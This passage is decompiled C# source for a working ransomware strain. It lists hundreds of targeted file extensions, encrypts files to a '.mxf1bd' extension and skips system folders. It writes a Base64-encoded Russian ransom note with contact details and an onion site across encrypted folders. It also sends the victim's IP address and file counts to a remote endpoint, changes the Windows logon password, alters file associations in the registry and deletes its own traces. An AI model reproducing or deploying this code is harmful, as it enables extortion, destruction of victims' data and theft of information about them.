				"wpt", "wpw", "wr1", "wrf", "wri", "wrk", "wrlk", "ws", "ws1", "ws2",
				"ws3", "ws4", "ws5", "ws6", "ws7", "WSB", "WSC", "wsd", "wsf", "wsh",
				"wsi", "wsm", "wsp", "wspak", "wtb", "wtbn", "wtd", "wtf", "wtml", "wtmp",
				"wtp", "wtr", "wts", "wtt", "wtx", "wud", "wvp", "wvw", "wvx", "wwcx",
				"WWD", "wwi", "wwl", "wws", "wwt", "wx", "wxmx", "wxp", "wyn", "wzn",
				"wzs", "x11", "x16", "x3f", "x3g", "x64", "xa", "xaf", "xaiml", "XAML",
				"xamlx", "xappl", "xar", "xas", "xav", "xbc", "xbd", "XBF", "xbk", "xbrl",
				"xbt", "xci", "xcsl", "xda", "xdb", "xdc", "xdf", "xdi", "xdna", "xdo",
				"xdoc", "xdp", "xds", "xdw", "xef", "xem", "xer", "xf", "xfd", "xfdf",
				"xfi", "xfl", "xflow", "xfn", "xfo", "xfp", "xfr", "xft", "xfx", "xgml",
				"xgmml", "xgp", "xht", "xhtm", "xhtml", "xif", "xig", "XIN", "xis", "xjf",
				"xl", "xla", "xlam", "xlb", "xlc", "xld", "xle", "xlf", "xlgc", "xliff",
				"xline", "xlist", "xlk", "xll", "xlm", "xlnk", "xlr", "xls", "xlsb", "xlse",
				"xlshtml", "xlsl", "xlsm", "xlst", "xlsx", "xlsxl", "xlt", "xlthtml", "xltm", "xltx",
				"xlv", "xlw", "xlwx", "xma", "xmap", "xmcd", "xmct", "xmd", "xmdf", "xmf",
				"xmi", "xmind", "xml", "xmlff", "xmlper", "xmmap", "xmn", "xmp", "xmpz", "xms",
				"xmt_bin", "xmta", "xmwx", "xmzx", "XPB", "xpd", "xpdl", "xpg", "xpi", "xpj",
				"xpll", "xpm", "xpr", "xps", "xpse", "xpt", "xpwe", "xqm", "xqr", "xqx",
				"xrb", "xrdml", "xrff", "xrp", "xry", "xsc", "xsd", "xsf", "xsig", "xsl",
				"xslt", "xsvf", "XSX", "xtbl", "xtd", "xtg", "xtm", "xtml", "xtp", "xtps",
				"xtrl", "xum", "xv0", "xv2", "xv3", "xva", "xvct", "xvd", "xvg", "xvid",
				"xvl", "xwd", "xweb3htm", "xweb3html", "xweb4stm", "xweb4xml", "xwf", "xwp", "xxd", "xxe",
				"xxx", "xy", "xy3", "xy4v", "xyd", "xyz", "xyzv", "yab", "yam", "ycbcra",
				"ychat", "yenc", "YES", "ygf", "yka", "yml", "ync", "yps", "yrcbck", "yrcbkm",
				"yrcdat", "yumtx", "yuv", "z02", "z04", "zap", "zbfx", "zdb", "zdc", "zdct",
				"ZFSENDTOTARGET", "zim", "zip", "zipx", "zix", "zma", "zmc", "zoo", "zpl", "zps",
				"ztmp", "ert", "efd", "biz", "CDX", "SQL", "DD", "MD", "MDF", "LOG",
				"DB", "BD", "LOG", "cfu", "DAT", "DBF", "DBX", "SDF", "BACK", "BACKUP",
				"BAC", "AWB", "DMP", "SAV", "TIB", "VBK", "VRB", "WBB", "TRN", "TIS",
				"ZIP", "RAR", "SQL", "BAK", "DCX", "DBC", "DBX", "DCT", "XLS", "XLSX",
				"DOC", "DOCX", "FPT", "LDF", "NDF", "$ER", "4DD", "4DL", "ACCDB", "ACCDC",
				"ACCDE", "ACCDR", "ACCDT", "ACCFT", "ADB", "ADB", "ADE", "ADF", "ADP", "ALF",
				"ASK", "BTR", "CAT", "CDB", "CDB", "CDB", "CKP", "CMA", "CPD", "CRYPT12",
				"CRYPT8", "CRYPT9", "DACPAC", "DAD", "DADIAGRAMS", "DASCHEMA", "DB", "DB", "DB-SHM", "DB-WAL",
				"DBCRYPT12", "DBCRYPT8", "DB3", "DBC", "DBF", "DBS", "DBT", "DBV", "DBX", "DCB",
				"DCT", "DCX", "DDL", "DLIS", "DP1", "DQY", "DSK", "DSN", "DTSX", "DXL",
				"ECO", "ECX", "EDB", "EDB", "EPIM", "EXB", "FCD", "FDB", "FDB", "FIC",
				"FMP", "FMP12", "FMPSL", "FOL", "FP3", "FP4", "FP5", "FP7", "FPT", "FRM",
				"GDB", "GDB", "GRDB", "GWI", "HDB", "HIS", "IB", "IDB", "IHX", "ITDB",
				"ITW", "JET", "JTX", "KDB", "KEXI", "KEXIC", "KEXIS", "LGC", "LWX", "MAF",
				"MAQ", "MAR", "MARSHAL", "MAS", "MAV", "MDB", "MDF", "MPD", "MRG", "MUD",
				"MWB", "MYD", "NDF", "NNT", "NRMLIB", "NS2", "NS3", "NS4", "NSF", "NV",
				"NV2", "NWDB", "NYF", "ODB", "ODB", "OQY", "ORA", "ORX", "OWC", "P96",
				"P97", "PAN", "PDB", "PDB", "PDM", "PNZ", "QRY", "QVD", "RBF", "RCTD",
				"ROD", "ROD", "RODX", "RPD", "RSD", "SAS7BDAT", "SBF", "SCX", "SDB", "SDB",
				"SDB", "SDB", "SDC", "SDF", "SIS", "SPQ", "SQL", "SQLITE", "SQLITE3", "SQLITEDB",
				"TE", "TEACHER", "TEMX", "TMD", "TPS", "TRC", "TRC", "TRM", "UDB", "UDL",
				"USR", "V12", "VIS", "VPD", "VVV", "WDB", "WMDB", "WRK", "XDB", "XLD",
				"XMLFF", "vmrs", "VMSC", "VMRS", "3me", "3pe", "hif", "iif", "lyt", "nd",
				"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qbb", "qbm", "qbmb", "qbo", "qbw",
				"qbx", "qdf", "qel", "qfx", "qpb", "qsd", "tax", "tax08", "tax09", "tax10",
				"tax11", "tax2008", "tax2009", "tax2010", "tax2011", "tlg", "tt11", "qb2011", "qb2012", "imt",
				"3ME", "3PE", "HIF", "IIF", "LYT", "ND", "QB2005", "QB2006", "QB2007", "QB2009",
				"QB2010", "QBB", "QBM", "QBMB", "QBO", "QBW", "QBX", "QDF", "QEL", "QFX",
				"QPB", "QSD", "TAX", "TAX08", "TAX09", "TAX10", "TAX11", "TAX2008", "TAX2009", "TAX2010",
				"TAX2011", "TLG", "TT11", "QB2011", "QB2012", "IMT", "VHDX", "VHD", "lxa", "LXA",
				"AVHD", "AVHDX", "OVA", "BKF"
			}, new string[0], DynamicPass, ".mxf1bd");
		}
		catch (Exception ex6)
		{
			if (debugmode)
			{
				try
				{
					File.AppendAllText(DebugReport, "Finish process: " + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		if (!NoNote || RegKeyError)
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
					streamWriter.WriteLine(Base64Decode("0JLQsNGI0Lgg0LTQvtC60YPQvNC10L3RgtGLLCDQsdCw0LfRiyDQtNCw0L3QvdGL0YUg0Lgg0LTRgNGD0LPQuNC1INGE0LDQudC70Ysg0LHRi9C70Lgg0LfQsNGI0LjRhNGA0L7QstCw0L3Riy4g0J3QviDQvdC1INGB0YLQvtC40YIg0L/QtdGA0LXQttC40LLQsNGC0YwhIA0K0JzRiyDQstGB0LUg0YDQsNGB0YjQuNGE0YDRg9C10Lwg0Lgg0LLQtdGA0L3QtdC8INC90LAg0YHQstC+0Lgg0LzQtdGB0YLQsC4NCg0K0JTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFOg0KDQrQndCw0L/QuNGI0LjRgtC1INC90LAg0L/QvtGH0YLRgyAtIHNlY3VyZTgyMkBtc2dzYWZlLmlvDQogDQogKtCSINC/0LjRgdGM0LzQtSDRg9C60LDQt9Cw0YLRjCDQktCw0Ygg0LvQuNGH0L3Ri9C5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGAIChLZXkgSWRlbnRpZmllcikNCiAq0J/RgNC40LrRgNC10L/QuNGC0LUgMiDRhNCw0LnQu9CwINC00L4gMiDQvNCxINC00LvRjyDRgtC10YHRgtC+0LLQvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60LguIA0KICDQvNGLINC40YUg0YDQsNGB0YjQuNGE0YDRg9C10LwsINCyINC60LDRh9C10YHRgtCy0LUg0LTQvtC60LDQt9Cw0YLQtdC70YzRgdGC0LLQsCwg0YfRgtC+INCi0J7Qm9Cs0JrQniDQnNCrINC80L7QttC10Lwg0YDQsNGB0YjQuNGE0YDQvtCy0LDRgtGMINGE0LDQudC70YsuDQoNCiAt0KfQtdC8INCx0YvRgdGC0YDQtdC1INCy0Ysg0YHQvtC+0LHRidC40YLQtSDQvdCw0Lwg0YHQstC+0Lkg0LjQtNC10L3RgtC40YTQuNC60LDRgtC+0YAsINGC0LXQvCDQsdGL0YHRgtGA0LXQtSDQvNGLINCy0YvQutC70Y7Rh9C40Lwg0L/RgNC+0LjQt9Cy0L7Qu9GM0L3QvtC1INGD0LTQsNC70LXQvdC40LUg0YTQsNC50LvQvtCyLg0KIC3QndCw0L/QuNGB0LDQsiDQvdCw0Lwg0L3QsCDQv9C+0YfRgtGDINCy0Ysg0L/QvtC70YPRh9C40YLQtSDQtNCw0LvRjNC90LXQudGI0LjQtSDQuNC90YHRgtGA0YPQutGG0LjQuCDQv9C+INC+0L/Qu9Cw0YLQtS4NCg0K0JIg0L7RgtCy0LXRgtC90L7QvCDQv9C40YHRjNC80LUg0JLRiyDQv9C+0LvRg9GH0LjRgtC1INC/0YDQvtCz0YDQsNC80LzRgyDQtNC70Y8g0YDQsNGB0YjQuNGE0YDQvtCy0LrQuC4NCtCf0L7RgdC70LUg0LfQsNC/0YPRgdC60LAg0L/RgNC+0LPRgNCw0LzQvNGLLdC00LXRiNC40YTRgNC+0LLRidC40LrQsCDQstGB0LUg0JLQsNGI0Lgg0YTQsNC50LvRiyDQsdGD0LTRg9GCINCy0L7RgdGB0YLQsNC90L7QstC70LXQvdGLLg0KDQrQnNGLINCz0LDRgNCw0L3RgtC40YDRg9C10Lw6DQoxMDAlINGD0YHQv9C10YjQvdC+0LUg0LLQvtGB0YHRgtCw0L3QvtCy0LvQtdC90LjQtSDQstGB0LXRhSDQstCw0YjQuNGFINGE0LDQudC70L7Qsg0KMTAwJSDQs9Cw0YDQsNC90YLQuNGOINGB0L7QvtGC0LLQtdGC0YHRgtCy0LjRjw0KMTAwJSDQsdC10LfQvtC/0LDRgdC90YvQuSDQuCDQvdCw0LTQtdC20L3Ri9C5INGB0LXRgNCy0LjRgQ0K0JLQvdC40LzQsNC90LjQtSENCiAqINCd0LUg0L/Ri9GC0LDQudGC0LXRgdGMINGD0LTQsNC70LjRgtGMINC/0YDQvtCz0YDQsNC80LzRgyDQuNC70Lgg0LfQsNC/0YPRgdC60LDRgtGMINCw0L3RgtC40LLQuNGA0YPRgdC90YvQtSDRgdGA0LXQtNGB0YLQstCwDQogKiDQn9C+0L/Ri9GC0LrQuCDRgdCw0LzQvtGB0YLQvtGP0YLQtdC70YzQvdC+0Lkg0YDQsNGB0YjQuNGE0YDQvtCy0LrQuCDRhNCw0LnQu9C+0LIg0L/RgNC40LLQtdC00YPRgiDQuiDQv9C+0YLQtdGA0LUg0JLQsNGI0LjRhSDQtNCw0L3QvdGL0YUNCiAqINCU0LXRiNC40YTRgNCw0YLQvtGA0Ysg0LTRgNGD0LPQuNGFINC/0L7Qu9GM0LfQvtCy0LDRgtC10LvQtdC5INC90LXRgdC+0LLQvNC10YHRgtC40LzRiyDRgSDQktCw0YjQuNC80Lgg0LTQsNC90L3Ri9C80LgsINGC0LDQuiDQutCw0Log0YMg0LrQsNC20LTQvtCz0L4g0L/QvtC70YzQt9C+0LLQsNGC0LXQu9GPDQrRg9C90LjQutCw0LvRjNC90YvQuSDQutC70Y7RhyDRiNC40YTRgNC+0LLQsNC90LjRjw0KDQoNCtCa0LDQttC00YvQtSAyNCDRh9Cw0YHQsCDRg9C00LDQu9GP0Y7RgtGB0Y8gMjQg0YTQsNC50LvQsCwg0L3QtdC+0LHRhdC+0LTQuNC80L4g0L/RgNC40YHQu9Cw0YLRjCDRgdCy0L7QuSDQuNC00LXQvdGC0LjRhNC40LrQsNGC0L7RgCDRh9GC0L7QsSDQvNGLINC+0YLQutC70Y7Rh9C40LvQuCDRjdGC0YMg0YTRg9C90LrRhtC40Y4uDQrQmtCw0LbQtNGL0LUgMjQg0YfQsNGB0LAg0YHRgtC+0LjQvNC+0YHRgtGMINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFINGD0LLQtdC70LjRh9C40LLQsNC10YLRgdGPINC90LAgMzAlICjRh9C10YDQtdC3IDcyINGH0LDRgdCwINGB0YPQvNC80LAg0YTQuNC60YHQuNGA0YPQtdGC0YHRjykNCg0KDQpQLlMNCtCV0YHQu9C4INCS0LDQvCDQvdC1INC+0YLQstC10YLQuNC70Lgg0LIg0YLQtdGH0LXQvdC40LggNDgg0YfQsNGB0L7Qsi4g0JLQsNC8INC90YPQttC90L4g0LHRg9C00LXRgiDRgdCy0Y/Qt9Cw0YLRjNGB0Y8g0YEg0L3QsNC80Lgg0L/QviDQtNC+0L/QvtC70L3QuNGC0LXQu9GM0L3Ri9C8INC60L7QvdGC0LDQutGC0LDQvC4gDQoNCtCh0LrQsNGH0LDQudGC0LUg0Lgg0YPRgdGC0LDQvdC+0LLQuNGC0LUgVG9yIEJyb3dzZXIgLSBodHRwczovL3d3dy50b3Jwcm9qZWN0Lm9yZy9ydS9kb3dubG9hZC8NCtCe0YLQutGA0L7QudGC0LUg0YfQtdGA0LXQtyBUb3IgQnJvd3NlciDRgdCw0LnRgiAtIGh0dHA6Ly9zb25hcm1zbmc1dnp3cWV6bHZ0dTJpaXd3ZG4zZHhraG90ZnRpa2hvd3BmanV6ZzdwM2NhNWVpZC5vbmlvbiAo0YHQsNC50YIg0L3QtSDQsdGD0LTQtdGCINGA0LDQsdC+0YLQsNGC0Ywg0YfQtdGA0LXQtyDQvtCx0YvRh9C90YvQuSDQsdGA0LDRg9C30LXRgCwg0YLQvtC70YzQutC+INGH0LXRgNC10Lcg0KLQntCgKQ0K0JfQsNGA0LXQs9C40YHRgtGA0LjRgNGD0LnRgtC10YHRjCDQuCDQvdCw0L/QuNGI0LjRgtC1INC90LDQvC4gDQoNCirQndCw0Ygg0L3QuNC6INCyIFNvbmFyJ2UgLSBzYXZlZmlsZTM2NQ==").Replace("%ID%", UtilMe.UniqID()).Replace("%USERNAME%", Environment.UserName).Replace("%MACHINENAME%", Environment.MachineName)
						.Replace("%DOMAINNAME%", Environment.UserDomainName));
					streamWriter.WriteLine("\r\n");
					if (ShowMainKEYID || !Unique)
					{
						streamWriter.WriteLine(Base64Decode("S0VZSUQ6IA=="));
						streamWriter.WriteLine(UniqueId);
					}
					if (MultipleThreads == "NO")
					{
						streamWriter.WriteLine("\r\n");
						streamWriter.WriteLine(Base64Decode("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(EncryptedFiles.Count));
					}
					if (UniqueHWID)
					{
						streamWriter.WriteLine("\r\n");
						streamWriter.WriteLine(Base64Decode("UEMgSGFyZHdhcmUgSUQ6IA=="));
						streamWriter.WriteLine(UtilMe.UniqID());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
					if (!text7.Contains(UniqueId) && !Unique)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt", "\r\nAdditional KeyId:\r\n" + UniqueId);
					}
				}
			}
			catch (Exception ex6)
			{
				if (debugmode)
				{
					try
					{
						File.AppendAllText(DebugReport, "Error while writing main note..." + ex6.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
			int num = 0;
			foreach (string encryptedDir in EncryptedDirs)
			{
				num++;
				try
				{
					if (encryptedDir == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
					{
						continue;
					}
				}
				catch
				{
				}
				try
				{
					if (!File.Exists(encryptedDir + "\\Инструкция.txt"))
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt", encryptedDir + "\\Инструкция.txt", overwrite: true);
					}
					else
					{
						string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
						if (!text7.Contains(UniqueId) && !Unique)
						{
							File.AppendAllText(encryptedDir + "\\Инструкция.txt", "\r\nAdditional KeyId:\r\n" + UniqueId);
						}
					}
				}
				catch (Exception ex6)
				{
					if (debugmode)
					{
						try
						{
							File.AppendAllText(DebugReport, "Error while writing main note..." + ex6.Message + "\r\n");
						}
						catch (Exception)
						{
						}
					}
					num--;
				}
				if (!multinote && num > 10)
				{
					break;
				}
			}
		}
		Associate();
		if ((RichText == "YES" && !NoNote) || (RichText == "YES" && RegKeyError))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta"))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta");
					streamWriter.WriteLine(Base64Decode("MESSAGERICH").Replace("%ID%", UtilMe.UniqID()).Replace("%USERNAME%", Environment.UserName).Replace("%MACHINENAME%", Environment.MachineName)
						.Replace("%DOMAINNAME%", Environment.UserDomainName));
					streamWriter.WriteLine("\r\n");
					if (ShowMainKEYID || !Unique)
					{
						streamWriter.WriteLine(Base64Decode(ReverseString("=AiOElUWFtkPisjclRnblNGI642ZpxWYtQHelRnI9UGb5R3cgAHP")));
						streamWriter.WriteLine(UniqueId + Base64Decode("PC9wPg=="));
					}
					if (MultipleThreads == "NO")
					{
						streamWriter.WriteLine("\r\n");
						streamWriter.WriteLine(Base64Decode("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + Base64Decode("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(EncryptedFiles.Count) + Base64Decode("PC9wPg=="));
					}
					if (UniqueHWID)
					{
						streamWriter.WriteLine("\r\n");
						streamWriter.WriteLine(Base64Decode("UEMgSGFyZHdhcmUgSUQ6IA=="));
						streamWriter.WriteLine(UtilMe.UniqID());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
					if (!text7.Contains(UniqueId) && !Unique)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta", Base64Decode("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAdditional KeyId:\r\n" + UniqueId + Base64Decode("PC9wPg=="));
					}
				}
			}
			catch (Exception ex6)
			{
				if (debugmode)
				{
					try
					{
						File.AppendAllText(DebugReport, "Error while writing rich text main note..." + ex6.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (FtpLog == "YES")
		{
			try
			{
				if (MultipleThreads == "NO")
				{
					UtilMe.Send("URL", "USERNAME", "ACCESO", string.Concat(Base64Decode("Q2xpZW50IElQOiA="), new WebClient().DownloadString(Base64Decode("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", Base64Decode("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", Base64Decode("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(EncryptedFiles.Count), "\r\n", Base64Decode("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), UniqueId));
				}
				else
				{
					UtilMe.Send("URL", "USERNAME", "ACCESO", string.Concat(Base64Decode("Q2xpZW50IElQOiA="), new WebClient().DownloadString(Base64Decode("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", Base64Decode("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", Base64Decode("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(EncryptedFiles.Count), "\r\n", Base64Decode("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), UniqueId));
				}
			}
			catch
			{
			}
		}
		if (WallpaperChanger == "YES")
		{
			try
			{
				Wallpaper.Set(new Uri(""));
			}
			catch
			{
			}
		}
		if (RichText == "NO" && !NoNote)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"))
				{
					Process.Start(Base64Decode("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
				}
				try
				{
					if (ConsoleReport)
					{
						Console.WriteLine("Starting text note...");
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
				if (debugmode)
				{
					try
					{
						File.AppendAllText(DebugReport, "Error while running main text note..." + ex6.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		else if (RichText == "YES" && !NoNote)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta"))
				{
					Process.Start(Base64Decode("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta");
				}
				try
				{
					if (ConsoleReport)
					{
						Console.WriteLine("Starting html note...");
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
				if (debugmode)
				{
					try
					{
						File.AppendAllText(DebugReport, "Error while running main html note..." + ex6.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (NotifyMe == "YES")
		{
			if (NotifyCustom == "YES" && !string.IsNullOrEmpty(LegalTitle) && !string.IsNullOrEmpty(LegalText))
			{
				ShowNotification(LegalTitle, LegalText);
			}
			else
			{
				ShowNotification();
			}
		}
		if (LogonPass != "LOGONISOFF")
		{
			ChangeWindowsUserPass(LogonPass);
		}
		if (!string.IsNullOrEmpty(toolLocation))
		{
			try
			{
				File.Delete(toolLocation);
			}
			catch
			{
			}
		}
		if (printnote)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"))
				{
					string message = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
					Printing.PrintNote(message);
				}
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc"));
			}
		}
		catch (Exception ex11)
		{
			try
			{
				File.AppendAllText(DebugReport, "Error deleting config text file: " + ex11.Message);
			}
			catch (Exception)
			{
			}
		}
		if (debugmode)
		{
			try
			{
				File.AppendAllText(DebugReport, "All Done!");
			}
			catch (Exception)
			{
			}
		}
		if (imha == "EVET")
		{
			CleanMyStuff();
		}
	}

	[DllImport("Shell32.dll")]
	private static extern int SHChangeNotify(int eventId, int flags, IntPtr item1, IntPtr item2);

	public static bool SetAssociation(string extension, string progId, string fileTypeDescription, string applicationFilePath)
	{
		return false | SetKeyDefaultValue(Base64Decode("U29mdHdhcmVcQ2xhc3Nlc1w=") + extension, progId) | SetKeyDefaultValue(Base64Decode("U29mdHdhcmVcQ2xhc3Nlc1w=") + progId, fileTypeDescription) | SetKeyDefaultValue(Base64Decode("U29mdHdhcmVcQ2xhc3Nlc1w=") + progId + Base64Decode("XHNoZWxsXG9wZW5cY29tbWFuZA=="), "\"" + applicationFilePath + "\" \"" + Path.GetTempPath() + "Инструкция.txt\"");
	}

	private static bool SetKeyDefaultValue(string keyPath, string value)
	{
		using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(keyPath))
		{
			if (registryKey.GetValue(null) as string!= value)
			{
				registryKey.SetValue(null, value);
				return true;
			}
		}
		return false;
	}

	public static void Associate()
	{
		try
		{
			if (SetAssociation(".mxf1bd", Base64Decode("Tm90ZXBhZA=="), Base64Decode("Tm90ZXBhZCBBcHBsaWNhdGlvbg=="), Base64Decode("Yzpcd2luZG93c1xzeXN0ZW0zMlxub3RlcGFkLmV4ZQ==")))
			{
				SHChangeNotify(134217728, 4096, IntPtr.Zero, IntPtr.Zero);
			}
			try
			{
				if (ConsoleReport)
				{
					Console.WriteLine("Extension association completed...");
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
			if (debugmode)
			{
				try
				{
					File.AppendAllText(DebugReport, "Extension association failed...");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static void Deceive()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(Base64Decode(ReverseString("==QesJXZw9mcwBib1JHIvRHIy9WayVGc1NHIy9GIygjL0AiL2Byay92dl1WYyZEIUVkTuACdm92cvJ3Yp1EIzVmcpVXclJHItFmcn9mcwBycphGV")), Base64Decode("SW5mb3JtYXRpb24uLi4="), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int NextInt(int min, int max)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(min, max);
	}

	public static List<string> TraverseTree(string root, string[] extensions, string extension, string[] excluded, string DynamicPass)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(root);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if ((text.Contains("C:\\Program Files\\") || text.Contains("C:\\Program Files (x86)\\") || text.Contains(":\\Windows\\") || text.ToLower().Contains("perflogs") || text.ToLower().Contains("internet explorer") || text.Contains(":\\ProgramData\\") || text.Contains("\\AppData\\") || text.ToLower().Contains("msocache") || text.ToLower().Contains("system volume information") || text.ToLower().Contains("boot") || text.ToLower().Contains("tor browser") || text.ToLower().Contains("mozilla") || text.ToLower().Contains("appdata") || text.ToLower().Contains("google chrome") || text.ToLower().Contains("application data")) && !text.Contains(Base64Decode("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI=")))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_016a;
			}
			catch
			{
			}
			continue;
			IL_016a:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("NTUSER.DAT") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(Base64Decode("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("Config.enc") && !fileInfo.FullName.Contains("Инструкция") && !fileInfo.FullName.EndsWith(".mxf1bd") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(MyStartName) && !fileInfo.FullName.Contains(DebugReport) && !fileInfo.FullName.Contains(LocalReportFileName))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == "YES")
						{
							list.Add(fileInfo.FullName);
							WorkerCrypter2(list, extensions, extension, excluded, DynamicPass);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && Size == "NO")
						{
							list.Add(fileInfo.FullName);
							WorkerCrypter2(list, extensions, extension, excluded, DynamicPass);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> GetFilesList(string docPath)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(docPath);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if ((!item.FullName.Contains("C:\\Program Files\\") && !item.FullName.Contains("C:\\Program Files (x86)\\") && !item.FullName.Contains(":\\Windows\\") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.Contains(":\\ProgramData\\") && !item.FullName.Contains("\\AppData\\") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && 